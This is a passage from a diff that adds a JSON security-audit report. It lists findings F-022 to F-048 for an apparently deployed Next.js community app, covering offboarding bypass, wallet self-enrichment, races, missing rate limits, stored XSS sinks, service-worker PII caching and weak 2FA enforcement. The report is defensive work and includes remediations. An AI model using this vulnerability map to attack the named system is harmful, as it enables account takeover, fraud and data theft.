+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (7.6)",
+      "cwe": "CWE-285, CWE-613",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "offboarded admin / member"
+      ],
+      "affected_panels": [
+        "all panels that role had"
+      ],
+      "categories": [
+        "Cat 1",
+        "Cat 3",
+        "Cat 11",
+        "Cat 23"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": "signIn callback"
+      },
+      "description": "The signIn callback queries Member.findFirst({ where: { email: { equals, mode: 'insensitive' } } }) and CommunityMember.findFirst(...) with no deletedAt: null filter. Soft-deleted users are still found, and the jwt callback then assigns them their original role. Offboarding via soft-delete is therefore cosmetic only \u2014 the user can immediately re-login and regain full access.",
+      "business_impact": "Offboarding is broken; insider risk after termination is unmitigated. Fired admin whose Google account is not yet revoked can sign back in and regain full CORE for 30 days.",
+      "remediation": "Add deletedAt: null filter to all findFirst calls in signIn and jwt. Explicit reject in signIn when member.deletedAt !== null. Replace soft-delete model with explicit status: 'active' | 'archived' | 'deleted'. Add an offboarding runbook step: revoke Google Workspace access before DB soft-delete."
+    },
+    {
+      "id": "F-022",
+      "title": "No input validation on earnReward / spendPoints / adminAdjust amounts (overflow + admin self-grant)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:H (5.5)",
+      "cwe": "CWE-20, CWE-190, CWE-840",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any caller of these functions; admins via adminAdjust"
+      ],
+      "affected_panels": [
+        "/wallet/adjust",
+        "all earn/spend paths"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 22",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "lib/wallet.ts",
+        "line_start": 28,
+        "line_end": 262,
+        "function": null
+      },
+      "description": "The wallet primitives accept xp, points, amount parameters with zero validation. There are no > 0 guards (negative points flows can credit instead of debit \u2014 see F-102), no upper bounds (admin can grant 999_999_999 points in one call \u2014 overflows the 32-bit Int per F-103), no admin daily cap, no dual-control. Combined with F-092 (no AuditLog), an admin can self-enrich silently.",
+      "business_impact": "Direct financial fraud (Bounty.cash is INR-denominated real money); inventory drain; reputational damage.",
+      "remediation": "Validate in every entry point: if (xp < 0 || xp > 1_000_000) throw; for spendPoints, if (amount <= 0) throw. For adminAdjust: cap at 10,000 points per single call; cap per-admin per-day at 50,000. Require approverEmail (second admin's email) for any adminAdjust over 1,000 or any negative. Migrate balance fields to BigInt. AuditLog every wallet primitive."
+    },
+    {
+      "id": "F-023",
+      "title": "Non-atomic stock decrement + spendPoints in swag redemption (oversell, double-charge)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3)",
+      "cwe": "CWE-362",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/swag"
+      ],
+      "categories": [
+        "Cat 12"
+      ],
+      "location": {
+        "file": "app/api/swag/[id]/redeem/route.ts",
+        "line_start": 38,
+        "line_end": 78,
+        "function": null
+      },
+      "description": "The redeem flow does (1) $executeRaw UPDATE SwagItem SET remainingStock decrement, (2) await spendPoints in a separate Serializable TX, (3) on failure manually $executeRaw UPDATE SwagItem rollback. Steps 1 and 2 are not in a single transaction; the rollback of step 1 in case of step 2 failure is not atomic. Race windows allow oversells and (rarer) double-charges.",
+      "business_impact": "Inventory mismanagement; user confusion; possible duplicate-shipping cost.",
+      "remediation": "Wrap the entire redeem flow (stock check + decrement + spendPoints + order create) in a single prisma.$transaction with isolationLevel: 'Serializable'. Inside the tx, use tx.swagItem.update with where remainingStock gte qty \u2014 Prisma will throw P2025 if the row no longer matches. spendPoints should accept an optional tx parameter to participate in the outer transaction."
+    },
+    {
+      "id": "F-024",
+      "title": "Concurrent bounty submission race \u2014 DB unique constraint missing per dev's own TODO",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N (5.3)",
+      "cwe": "CWE-362",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/bounty"
+      ],
+      "categories": [
+        "Cat 12",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/bounty/submissions/route.ts",
+        "line_start": 112,
+        "line_end": 152,
+        "function": null
+      },
+      "description": "BountySubmission lacks @@unique([bountyId, submittedById]) (the developer's own code comment notes this should be added but it isn't). The route does a findFirst pre-check \u2014 non-atomic with the subsequent create \u2014 so concurrent POSTs can both succeed. On approval each submission triggers earnReward, doubling the payout.",
+      "business_impact": "Duplicate-payout fraud on bounty rewards; ledger inflation; trust erosion among legitimate participants.",
+      "remediation": "Add @@unique([bountyId, submittedById]) and @@unique([bountyId, publicUserId]) to the schema; migrate. Replace findFirst + create with a single create and catch P2002 \u2192 return 409. Wrap approval + earnReward in a Serializable transaction."
+    },
+    {
+      "id": "F-025",
+      "title": "Zero rate-limiting on points-earning endpoints (quests, bounty, swag, speedrun)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H (6.5)",
+      "cwe": "CWE-770, CWE-799",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any authenticated user"
+      ],
+      "affected_panels": [
+        "/quests",
+        "/bounty",
+        "/swag",
+        "/speedrun"
+      ],
+      "categories": [
+        "Cat 21",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/quests/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The recon noted a per-user rate-limit utility exists but it is applied inconsistently. None of the points-earning routes enforce it. Combined with F-009 (race) and F-005 (replay), an attacker can farm points at line-rate.",
+      "business_impact": "Mass point-farming undetected; economy collapse; admin reconciliation nightmare.",
+      "remediation": "Apply rateLimit({ key: session.user.email, max: 5, windowSec: 60 }) to every mutating route under quests/bounty/swag/speedrun. Add a global per-IP rate limit (60 req/min) at middleware. Alert on per-user POST rate > 10/min on any mutating endpoint."
+    },
+    {
+      "id": "F-026",
+      "title": "Zero rate-limiting on admin cost-amplification endpoints (broadcast, send-email, export)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:H (4.7)",
+      "cwe": "CWE-770",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "any CORE"
+      ],
+      "affected_panels": [
+        "/core/event-feedback",
+        "/core/applications",
+        "/core/members (broadcast)"
+      ],
+      "categories": [
+        "Cat 21",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/event-feedback/send-email/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Admin email-broadcast endpoints loop through the recipient list and call SMTP per recipient; no per-call rate limit and no per-day cap. A single (compromised or careless) admin can blow through the SMTP quota or fan-out spam to every member instantly.",
+      "business_impact": "SMTP quota exhaustion; spam fan-out to all members from a single compromised CORE; reputational damage; deliverability lost (SPF/DKIM impact).",
+      "remediation": "Cap broadcasts at 1 per admin per 5 minutes; queue large batches. Cap recipient count per single call. Audit-log every broadcast (see F-029)."
+    },
+    {
+      "id": "F-027",
+      "title": "No rate-limiting on authentication paths / NextAuth callbacks (credential-stuffing surface)",
+      "severity": "High",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (5.3)",
+      "cwe": "CWE-307",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "/api/auth/*"
+      ],
+      "categories": [
+        "Cat 11",
+        "Cat 21",
+        "Cat 22"
+      ],
+      "location": {
+        "file": "app/api/auth/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "NextAuth's callback routes (/api/auth/callback/google, /api/auth/signin, etc.) have no rate limit. While Google OAuth itself rate-limits, the callback route still does DB lookups and creates rows; a denial-of-service attacker can spam the callback to exhaust DB connections. There is also no per-IP enumeration limit on signIn (compounded by F-110 timing oracle).",
+      "business_impact": "DB connection exhaustion; auth-callback DoS; credential-stuffing facilitation; chained with F-110 enables account enumeration at scale.",
+      "remediation": "Add 10 req/min per IP at middleware on /api/auth/*. Add 30 req/hour per email on /api/auth/callback/*."
+    },
+    {
+      "id": "F-028",
+      "title": "No anomaly detection / no Sentry-init / no alerting on auth or wallet anomalies",
+      "severity": "High",
+      "cwe": "CWE-778, CWE-693",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all (monitoring gap)"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": "package.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Although NEXT_PUBLIC_SENTRY_DSN is set (F-034), no Sentry.init() is found in the source \u2014 Sentry is dormant. No anomaly detection on wallet flows, no alerts on auth-failures, no impossible-travel detection (F-067), no balance-spike alerts (F-068). The team will not know when an attack is in progress.",
+      "business_impact": "Active attacks pass silently; mean-time-to-detect approaches infinity; only user complaints surface compromise \u2014 too late for containment.",
+      "remediation": "Implement Sentry.init() in app/layout.tsx (client) and instrumentation.ts (server). Add wallet-anomaly job: query WalletTransaction daily for top-N earners; alert on > 3\u03c3. Pipe auth-failure events to Slack. Add impossible-travel detection on signin."
+    },
+    {
+      "id": "F-029",
+      "title": "No audit log on admin login / admin PII reads / admin email broadcasts",
+      "severity": "High",
+      "cwe": "CWE-778",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "all admins"
+      ],
+      "affected_panels": [
+        "all admin surfaces"
+      ],
+      "categories": [
+        "Cat 7",
+        "Cat 11",
+        "Cat 13",
+        "Cat 25",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": "signIn callback"
+      },
+      "description": "signIn callback does not write to AuditLog (so we don't know who logged in when). GET /api/members, GET /api/admin/public-users, GET /api/speedrun/registrations, and the CSV-export endpoint do not audit-log admin reads of PII. Email-broadcast endpoint does not log broadcasts. Combined with F-013 (audit-log mutability), the full insider-detection layer is absent.",
+      "business_impact": "Insider-threat detection is impossible; PII access is invisible; broadcasts cannot be attributed; SOC 2 / ISO 27001 audit-logging requirements violated.",
+      "remediation": "Add logAudit({ action: 'ADMIN_LOGIN', actorId, metadata: { ip, ua } }) in signIn callback for CORE/MEMBER signins. Add logAudit({ action: 'PII_READ', resource, count }) in admin PII-list endpoints. Audit every email broadcast."
+    },
+    {
+      "id": "F-030",
+      "title": "broadcastToRunRegistrants() iterates synchronously across registrants \u2014 fan-out timeout / partial-delivery",
+      "severity": "High",
+      "cwe": "CWE-400, CWE-1284",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "Speedrun captains using broadcast"
+      ],
+      "affected_panels": [
+        "/speedrun (broadcast feature)"
+      ],
+      "categories": [
+        "Cat 9"
+      ],
+      "location": {
+        "file": "lib/speedrunNotify.ts",
+        "line_start": 157,
+        "line_end": 184,
+        "function": "broadcastToRunRegistrants"
+      },
+      "description": "The broadcastToRunRegistrants function iterates over the registrant list and awaits a notification (push + email) per registrant in a single function invocation. With 500+ registrants, the Vercel function timeout (60s default) will hit before completion; some recipients receive notifications, others do not, and there is no retry queue or visibility into the partial state.",
+      "business_impact": "Partial-delivery of critical broadcasts; captain has no visibility into who received what; recipients get inconsistent communication.",
+      "remediation": "Split into an enqueue + worker pattern: enqueue one job per recipient (or per chunk of 50) into a queue (Vercel Queues, Inngest, or Redis-based). Workers handle each chunk independently, idempotently. UI shows per-broadcast progress and retry failed chunks. Alert if any broadcast invocation runs > 30s.",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:H (4.7)"
+    },
+    {
+      "id": "F-031",
+      "title": "No serverless function memory/timeout caps configured in vercel.json (cost & DoS amplification)",
+      "severity": "High",
+      "cwe": "CWE-400",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "anyone able to trigger an expensive route"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 9"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": "no functions config object"
+      },
+      "description": "vercel.json has no functions map specifying per-route maxDuration / memory overrides. All routes inherit Vercel's account default (60s, 1024 MB on Pro). Expensive endpoints (CSV export, broadcast, sync-events) can run to the full quota; F-122 (data-grid fetches all rows) makes this exploitable as a DoS.",
+      "business_impact": "Cost amplification via DoS on expensive endpoints; serverless billing exposure; legitimate traffic starved.",
+      "remediation": "Set per-route caps in vercel.json: cron handlers maxDuration: 300, memory: 1024; user-facing routes maxDuration: 10, memory: 512; export routes maxDuration: 30, memory: 1024.",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (5.3)"
+    },
+    {
+      "id": "F-032",
+      "title": "Trusted Types not enforced (require-trusted-types-for 'script' missing) \u2014 DOM-XSS unmitigated",
+      "severity": "High",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 16",
+        "Cat 17"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": 29,
+        "line_end": 43,
+        "function": null
+      },
+      "description": "CSP is missing require-trusted-types-for 'script' and trusted-types default 'allow-duplicates'. With F-008 (unsafe-inline) already permitting injection and F-033 (innerHTML in playbook editor) providing a sink, DOM-based XSS has no browser-level mitigation.",
+      "business_impact": "Lack of last-line-of-defense against DOM XSS; chained with F-008/F-033 the residual risk of stored XSS becomes account-takeover-grade.",
+      "remediation": "Add Trusted Types directives to CSP after auditing innerHTML usage. Wrap legitimate innerHTML sites with a Trusted Types policy that calls DOMPurify.",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N (8.3)"
+    },
+    {
+      "id": "F-033",
+      "title": "innerHTML / dangerouslySetInnerHTML used without sanitization in playbook image fallback + markdown render",
+      "severity": "High",
+      "cwe": "CWE-79",
+      "owasp": "A03:2021",
+      "affected_roles": [
+        "any user; admin if attacker is member"
+      ],
+      "affected_panels": [
+        "/core/playbooks",
+        "/public/playbooks"
+      ],
+      "categories": [
+        "Cat 16",
+        "Cat 17",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "components/playbooks/Editor.tsx",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Playbook editor and the new MarkdownEditor render user content via paths that include dangerouslySetInnerHTML and an <img onerror=...> fallback pattern. No DOMPurify / no rehype-sanitize chain. With F-008 CSP open, stored XSS in a playbook executes in any viewer's session.",
+      "business_impact": "Stored XSS in playbook \u2192 any viewer (including admins) compromised; account takeover via permission-grant chained calls.",
+      "remediation": "Pipe all rendered markdown through rehype-sanitize with a strict allow-list. Replace <img onerror> fallback with a React state approach. Run eslint-plugin-react/no-danger rule to block regressions.",
+      "cvss_3_1": "AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (8.0)"
+    },
+    {
+      "id": "F-034",
+      "title": "NEXT_PUBLIC_SENTRY_DSN exposed without an active Sentry.init() (DSN leak + monitoring gap)",
+      "severity": "High",
+      "cwe": "CWE-200",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "anyone scanning the bundle"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 16",
+        "Cat 25"
+      ],
+      "location": {
+        "file": "package.json",
+        "line_start": null,
+        "line_end": null,
+        "function": "client bundle"
+      },
+      "description": "The DSN is exposed (which is fine \u2014 DSNs are designed as public IDs), but no Sentry.init() call exists in source. So: monitoring is dead, AND attackers see the DSN signaling the team intended monitoring (and can spam quota by sending fake events to that DSN). High severity on the monitoring-gap aspect.",
+      "business_impact": "Monitoring dormant; attacks invisible; quota exhaustion via fake events; conflicting signal that team thinks they have monitoring when they don't.",
+      "remediation": "Either remove the DSN env var (if Sentry is not in use), or properly initialize Sentry on client + server.",
+      "cvss_3_1": "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (3.1)"
+    },
+    {
+      "id": "F-035",
+      "title": "Cron endpoint 404 at trigger path (cron schedule references missing route)",
+      "severity": "High",
+      "cwe": "CWE-754",
+      "owasp": "A04:2021",
+      "affected_roles": [
+        "all (downstream of cron-driven cleanup)"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The Cat 10 scan flagged a cron trigger pointing to a path that 404s. Either the route was deleted/renamed without updating vercel.json or vice versa. Result: the cleanup/expire job never runs, leading to silent data retention bloat or stale state. Verify and reconcile vercel.json cron paths against app/api/cron/* route files.",
+      "business_impact": "Silent cron failure; data retention violations; expired-points/cleanup never runs; compliance gap; storage cost growth.",
+      "remediation": "Add a CI check: enumerate vercel.json cron paths, HEAD each one against the freshly-deployed URL and assert 200/401 (not 404)."
+    },
+    {
+      "id": "F-036",
+      "title": "Permissive host rewrite / WAF bypass vector via leading-dot host header",
+      "severity": "High",
+      "cwe": "CWE-444",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "anyone"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 10"
+      ],
+      "location": {
+        "file": "next.config.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Cat 10 flagged a permissive Host header handling pattern that may allow WAF bypass via leading-dot or unusual host strings. While Vercel's edge layer normalizes most headers, the application-side host check can be tricked.",
+      "business_impact": "WAF bypass; possible request smuggling; routing trust violations leading to unexpected privileged behavior.",
+      "remediation": "Pin host validation to an explicit allowlist (team1india.vercel.app, custom domain). Reject requests with unexpected Host headers at middleware before any application logic.",
+      "cvss_3_1": "AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N (6.4)"
+    },
+    {
+      "id": "F-037",
+      "title": "2FA enforcement only at middleware, not at NextAuth login callback (single-factor JWT issued)",
+      "severity": "High",
+      "cwe": "CWE-287, CWE-308",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "any 2FA-enabled user"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 3",
+        "Cat 11",
+        "Cat 30"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 156,
+        "line_end": 156,
+        "function": "jwt callback"
+      },
+      "description": "The NextAuth jwt callback issues a fully-privileged JWT before the 2FA challenge is presented. Middleware then redirects 2FA-required routes to a TOTP page. This means: (a) the JWT is single-factor and could be exfiltrated post-OAuth-callback before TOTP completes; (b) any route not covered by middleware is reachable with a single-factor session.",
+      "business_impact": "2FA is a paper tiger if attacker bypasses middleware path coverage; new routes are at risk; defeats the purpose of step-up auth.",
+      "remediation": "Mark JWT as tfaPending: true on issuance; gate session callback (or every privileged route) on tfaSatisfied: true. Only set tfaSatisfied after TOTP/passkey verification.",
+      "cvss_3_1": "AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N (6.5)"
+    },
+    {
+      "id": "F-038",
+      "title": "Service Worker caches authenticated /core.* HTML for 5 min on shared device",
+      "severity": "High",
+      "cwe": "CWE-525",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "any user on a shared device"
+      ],
+      "affected_panels": [
+        "/core/*"
+      ],
+      "categories": [
+        "Cat 5",
+        "Cat 15"
+      ],
+      "location": {
+        "file": "public/sw.js",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "The Service Worker caches GET responses for paths matching the /core.* pattern with a 5-minute TTL. On a shared device, after admin Alice logs out, the next user (visiting /core/members) is served Alice's cached HTML containing PII. Logout does not invalidate the SW cache.",
+      "business_impact": "PII leakage on shared devices; admin pages rendered to next visitor; compliance exposure; chained with F-004 enables revoked-admin to view cached UI.",
+      "remediation": "Exclude /core/* and /api/* from SW caching entirely (only cache /_next/static/* and /icons/*). On logout, send clients.claim() + caches.delete(...) to wipe the cache. Add Cache-Control: private, no-store headers to all /core/* HTML responses.",
+      "cvss_3_1": "AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (5.5)"
+    },
+    {
+      "id": "F-039",
+      "title": "Service Worker BYOSW (Bring-Your-Own-Service-Worker) registration not isolated to scope",
+      "severity": "High",
+      "cwe": "CWE-942",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "all PWA users"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 15"
+      ],
+      "location": {
+        "file": "public/sw.js",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "SW is registered at the root scope. Combined with F-008 CSP allowing unsafe-inline, a stored-XSS could re-register a malicious SW that intercepts all subsequent requests (the SW would persist across page navigations and survive logout).",
+      "business_impact": "Persistent client-side compromise; survives logout; intercepts all future requests; full session hijack.",
+      "remediation": "Register SW with { scope: '/pwa/' } and only enable PWA features under that scope. Or strictly validate serviceWorker updates and add a kill-switch (server-side flag the SW polls).",
+      "cvss_3_1": "AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (6.8)"
+    },
+    {
+      "id": "F-040",
+      "title": "Web Push payload encryption flow uses VAPID privKey at runtime \u2014 key compromise = mass push hijack",
+      "severity": "High",
+      "cwe": "CWE-321",
+      "owasp": "A02:2021",
+      "affected_roles": [
+        "all push-subscribed users"
+      ],
+      "affected_panels": [
+        "push notifications"
+      ],
+      "categories": [
+        "Cat 15",
+        "Cat 24"
+      ],
+      "location": {
+        "file": "lib/webpush.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "VAPID private key is loaded into every serverless function on cold start. If the key is leaked (Vercel logs, errored stack trace), an attacker can impersonate the platform to all push-subscribed users (browser displays the message as if from the platform).",
+      "business_impact": "Mass push-impersonation; phishing at scale via 'trusted' push notifications; reputation damage; user trust collapse.",
+      "remediation": "Move push-send to a single dedicated function (e.g., /api/internal/push) accessible only via internal call from queued jobs. Rotate VAPID key annually; document rotation playbook. Add audit log for every push send.",
+      "cvss_3_1": "AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H (7.2)"
+    },
+    {
+      "id": "F-041",
+      "title": "No SCA / SAST / Dependabot / SBOM in CI; supply-chain compromises undetected",
+      "severity": "High",
+      "cwe": "CWE-1357",
+      "owasp": "A06:2021",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 26",
+        "Cat 30"
+      ],
+      "location": {
+        "file": ".github/workflows/",
+        "line_start": null,
+        "line_end": null,
+        "function": "directory missing"
+      },
+      "description": "No .github/workflows/ directory; no Dependabot config; no SBOM generation; no npm audit / pnpm audit / bun audit step in CI. The project depends on 100+ npm packages including pre-1.0 BlockNote and EOL-trajectory next-auth v4. A compromised dependency goes undetected.",
+      "business_impact": "Supply-chain attacks invisible; no software bill of materials for incident response; vulnerable dependencies persist undetected.",
+      "remediation": "Add .github/dependabot.yml (weekly checks). Add .github/workflows/security.yml running: bun audit, osv-scanner, gitleaks, semgrep --config p/owasp-top-ten. Generate SBOM via cyclonedx-bun on every release. Set up GitHub Code Scanning (CodeQL)."
+    },
+    {
+      "id": "F-042",
+      "title": "Member.signupIp + signin email logged plaintext on every login (PII in app logs)",
+      "severity": "High",
+      "cwe": "CWE-532",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "all signins"
+      ],
+      "affected_panels": [
+        "authentication"
+      ],
+      "categories": [
+        "Cat 11",
+        "Cat 13",
+        "Cat 25",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "lib/auth-options.ts",
+        "line_start": 13,
+        "line_end": 86,
+        "function": "signIn callback"
+      },
+      "description": "signIn callback emits console.log('signin: ' + email) style entries; email is plaintext and persisted in Vercel function logs (typically retained 30+ days). IP address is also captured into the DB and logged. PII in logs violates DPDP \u00a78 / GDPR Art. 5(1)(c) data minimization.",
+      "business_impact": "Data-minimization violation; PII in logs accessible to anyone with Vercel log access; regulatory exposure; chain with F-014 multiplies risk.",
+      "remediation": "Replace email logs with hashed user ID; if email is needed for support correlation, hash with HMAC keyed by a separate secret. Don't log IP except in dedicated audit pipeline (with retention policy).",
+      "cvss_3_1": "AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.4)"
+    },
+    {
+      "id": "F-043",
+      "title": "Speedrun registrations bulk-export (CSV) endpoint not rate-limited and not audited",
+      "severity": "High",
+      "cwe": "CWE-770, CWE-778",
+      "owasp": "A09:2021",
+      "affected_roles": [
+        "any CORE"
+      ],
+      "affected_panels": [
+        "/core/speedrun"
+      ],
+      "categories": [
+        "Cat 7",
+        "Cat 13",
+        "Cat 19",
+        "Cat 21",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/api/speedrun/registrations/export/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Re-stated dimension of F-017 from the rate-limit / audit-trail perspective. The bulk-export endpoint can be called repeatedly by any CORE without throttling, and no audit log entry records who pulled what.",
+      "business_impact": "Same as F-017: PII exfiltration at scale; insider-threat detection blind.",
+      "remediation": "See F-017 remediation. Add rateLimit (1 export per CORE per hour) and logAudit on every call.",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (4.9)"
+    },
+    {
+      "id": "F-044",
+      "title": "Step-up auth missing on critical actions (permission change, 2FA disable, wallet adjust, role downgrade)",
+      "severity": "High",
+      "cwe": "CWE-308",
+      "owasp": "A07:2021",
+      "affected_roles": [
+        "any CORE / any user with 2FA"
+      ],
+      "affected_panels": [
+        "/core/members",
+        "/me/2fa",
+        "/core/wallet"
+      ],
+      "categories": [
+        "Cat 5",
+        "Cat 7",
+        "Cat 13"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Permission-grant, 2FA disable, and wallet-adjust endpoints accept the existing session with no re-auth challenge. A momentary session hijack (open laptop, F-038 SW cache) is enough to perform the highest-impact actions.",
+      "business_impact": "Single hijack moment \u2192 permanent privilege escalation or 2FA-disable; defeats compensating controls relying on 2FA.",
+      "remediation": "Require a fresh TOTP/passkey challenge (stored short-lived step_up JWT claim valid 5 min) before processing any of these endpoints. Pair with F-012 4-eyes flow.",
+      "cvss_3_1": "AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N (6.6)"
+    },
+    {
+      "id": "F-045",
+      "title": "Public Vercel preview deployment may share prod DATABASE_URL / NEXTAUTH_SECRET",
+      "severity": "High",
+      "cwe": "CWE-540",
+      "owasp": "A05:2021",
+      "affected_roles": [
+        "PR-deploy capable contributors"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 23",
+        "Cat 26"
+      ],
+      "location": {
+        "file": "vercel.json",
+        "line_start": null,
+        "line_end": null,
+        "function": "Vercel UI (out of repo)"
+      },
+      "description": "Re-stated from Cat 23 (data-store) angle: same root cause as F-014 but separately tracked because the data-store dimension calls for separate DATABASE_URL more loudly than the auth dimension. Verify in Vercel UI.",
+      "business_impact": "If confirmed: total system compromise via PR (chain with F-014).",
+      "remediation": "See F-014. Provision separate preview DB; scope DATABASE_URL only to Production env."
+    },
+    {
+      "id": "F-046",
+      "title": "No SoD between super-admin role-grant and approval; same admin can grant + approve",
+      "severity": "Medium",
+      "cwe": "CWE-1220",
+      "affected_roles": [
+        "FULL_ACCESS admins"
+      ],
+      "affected_panels": [
+        "/core/members"
+      ],
+      "categories": [
+        "Cat 3",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "app/api/members/[id]/permissions/route.ts",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "A single FULL_ACCESS admin can both initiate and finalize permission grants. No second-approver workflow.",
+      "business_impact": "Insider risk on privilege grants; SOX/ISO 27001 SoD non-compliance.",
+      "remediation": "Implement the 4-eyes pattern from F-012; gate all FULL_ACCESS grants on dual-control.",
+      "owasp": "A01:2021"
+    },
+    {
+      "id": "F-047",
+      "title": "Audit log retention policy not codified in repo; < incident-detection window",
+      "severity": "Medium",
+      "cwe": "CWE-778",
+      "affected_roles": [
+        "all"
+      ],
+      "affected_panels": [
+        "all"
+      ],
+      "categories": [
+        "Cat 25",
+        "Cat 27"
+      ],
+      "location": {
+        "file": "prisma/schema.prisma",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "No retention policy is documented or enforced for AuditLog/Log tables. Industry-typical incident detection windows are 200+ days; the table grows unbounded with no archival/purge job.",
+      "business_impact": "Compliance gap; incident forensics may exceed retention; storage cost growth unbounded.",
+      "remediation": "Define a retention policy (e.g., 365 days hot, 7 years cold storage); add a cron job for archival to S3; document in docs/security/.",
+      "owasp": "A09:2021"
+    },
+    {
+      "id": "F-048",
+      "title": "Audit log readable to all CORE (insider visibility into coworker actions)",
+      "severity": "Medium",
+      "cwe": "CWE-359",
+      "affected_roles": [
+        "all CORE"
+      ],
+      "affected_panels": [
+        "/core/audit-log"
+      ],
+      "categories": [
+        "Cat 25"
+      ],
+      "location": {
+        "file": "app/api/audit/",
+        "line_start": null,
+        "line_end": null,
+        "function": null
+      },
+      "description": "Any CORE user can read the full AuditLog including other admins' actions. Provides reconnaissance value to insiders/compromised accounts.",
+      "business_impact": "Insider reconnaissance; compromised CORE can map admin behavior patterns to identify high-value targets.",
+      "remediation": "Restrict full audit-read to a dedicated audit:READ permission; show users only their own actions by default.",
+      "owasp": "A01:2021"
+    },
+    {
+      "id": "F-049",
